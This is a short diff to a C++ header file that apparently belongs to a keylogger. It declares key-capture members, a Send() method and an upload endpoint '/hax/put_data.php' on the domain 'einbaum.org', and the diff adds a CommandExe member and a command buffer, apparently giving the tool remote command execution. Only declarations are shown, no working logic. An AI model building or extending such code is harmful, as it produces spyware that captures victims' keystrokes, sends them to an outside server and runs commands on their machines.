@@ -1,5 +1,6 @@
 #pragma once
 #include "stdafx.h"
+#include "CommandExe.h"
 
 #define V_NET_FILE "/hax/put_data.php"
 #define V_NET_DOMAIN "einbaum.org"
@@ -20,7 +21,10 @@ private:
     void CheckKey(short vkey, bool shift);
     void Send();
 
+    CommandExe cmd;
     std::vector<const char*> keysPressed;
     bool keysActive[256 + 1];
+
     char cmdBuf[4096];
+    size_t cmdBufLen;
 };
